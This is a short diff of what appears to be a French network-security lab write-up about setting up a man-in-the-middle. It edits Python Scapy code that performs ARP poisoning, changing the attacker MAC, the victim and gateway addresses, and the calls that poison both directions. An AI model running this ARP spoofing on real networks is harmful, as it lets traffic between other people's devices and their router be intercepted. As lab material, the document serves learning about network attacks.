@@ -127,11 +127,11 @@ fe80::60d0:39ff:fef1:3f64 dev wlp3s0 lladdr 62:d0:39:f1:3f:64 router STALE
 ```
 
 ```py
-from scapy.all import ARP, Ether, sendp, conf, getmacbyip
+from scapy.all import *
 
 def arp_poison(victim_ip, victim_mac, router_ip):
     # Get your own MAC address (attacker's MAC)
-    attacker_mac = "b8:1e:a4:6c:56:97"
+    attacker_mac = "90:e8:68:15:ac:43"
     
     # Create an Ethernet frame with the destination MAC as the victim's MAC
     ethernet = Ether(dst=victim_mac)
@@ -150,13 +150,13 @@ def arp_poison(victim_ip, victim_mac, router_ip):
 ⭐ Mettre en place un MITM
 
 ```py
-target_ip = "192.168.11.7"  # IP of the victim
-target_mac = "34-C9-3D-22-97-2D"  # MAC of the victim
-spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)
+target_ip = "172.20.10.5"  # IP of the victim
+target_mac = "b8:1e:a4:6c:56:97"  # MAC of the victim
+spoof_ip = "172.20.10.1"  # IP you want to spoof (usually the gateway)
 
-target_ip2 = "192.168.11.46"  # IP of the victim
-target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
-spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)
+target_ip2 = "172.20.10.1"  # IP of the victim
+target_mac2 = "62:d0:39:f1:3f:64"  # MAC of the victim
+spoof_ip2 = "172.20.10.5"  # IP you want to spoof (usually the gateway)
 
 arp_poison(target_ip, target_mac, spoof_ip)
 arp_poison(target_ip2, target_mac2, spoof_ip2)
